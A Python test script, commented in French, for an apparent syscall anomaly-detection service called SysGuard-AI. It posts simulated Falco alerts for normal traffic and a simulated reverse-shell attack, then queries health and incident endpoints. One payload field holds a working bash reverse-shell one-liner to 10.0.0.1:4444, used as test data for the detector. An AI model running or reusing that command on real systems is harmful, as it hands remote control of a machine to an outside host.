"""Test rapide du pipeline SysGuard-AI."""
import json
import httpx

BASE = "http://localhost:8000"


def test():
    client = httpx.Client(timeout=10.0)

    print("=" * 60)
    print("  SysGuard-AI -- Test rapide du pipeline")
    print("=" * 60)

    # Test 1 : Trafic normal
    print("\n[TEST 1] Trafic NORMAL (read + write + close)...")
    for evt in ["read", "write", "close", "read", "write"]:
        r = client.post(f"{BASE}/falco-webhook", json={
            "rule": "", "output": "Normal HTTP",
            "output_fields": {"container.id": "nginx-001", "evt.type": evt},
        })
    d = r.json()
    print(f"  Verdict : {d['verdict']}")
    print(f"  MSE     : {d['mse']}")
    print(f"  Latence : {d.get('tier1_latency_ms', '?')} ms")

    # Test 2 : Attaque reverse shell
    print("\n[TEST 2] ATTAQUE reverse shell (execve + connect + dup2)...")
    attack_cid = "attack-reverse-shell-001"
    for _ in range(50):
        client.post(f"{BASE}/falco-webhook", json={
            "rule": "Shell in container",
            "output": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "output_fields": {"container.id": attack_cid, "evt.type": "execve"},
        })
    for _ in range(30):
        client.post(f"{BASE}/falco-webhook", json={
            "rule": "Shell in container",
            "output": "connect to C2",
            "output_fields": {"container.id": attack_cid, "evt.type": "connect"},
        })
    for _ in range(20):
        client.post(f"{BASE}/falco-webhook", json={
            "rule": "Shell in container",
            "output": "dup2 redirection",
            "output_fields": {"container.id": attack_cid, "evt.type": "dup2"},
        })
    r = client.post(f"{BASE}/falco-webhook", json={
        "rule": "Shell in container",
        "output": "dup2 redirection",
        "output_fields": {"container.id": attack_cid, "evt.type": "dup2"},
    })
    d = r.json()
    print(f"  Verdict  : {d['verdict']}")
    print(f"  Severity : {d.get('severity', 'N/A')}")
    print(f"  MSE      : {d['mse']}")
    print(f"  Action   : {d.get('final_action', 'N/A')}")
    print(f"  Latence  : {d.get('tier1_latency_ms', '?')} ms")
    top = d.get("top_syscalls", [])
    if top:
        print(f"  Top syscalls :")
        for s in top:
            print(f"    - {s['syscall']}: {s['count']}")

    # Test 3 : Healthz
    print("\n[TEST 3] Endpoint /healthz...")
    r = client.get(f"{BASE}/healthz")
    print(json.dumps(r.json(), indent=2))

    # Test 4 : Incidents
    print("\n[TEST 4] Endpoint /incidents...")
    r = client.get(f"{BASE}/incidents")
    data = r.json()
    print(f"  Total incidents : {data['total']}")
    if data["incidents"]:
        last = data["incidents"][-1]
        print(f"  Dernier incident : {last['incident_id']}")
        print(f"    Severity : {last['detection']['severity']}")
        print(f"    MSE      : {last['detection']['mse_score']}")

    print("\n" + "=" * 60)
    print("  TESTS TERMINES")
    print("=" * 60)
    client.close()


if __name__ == "__main__":
    test()
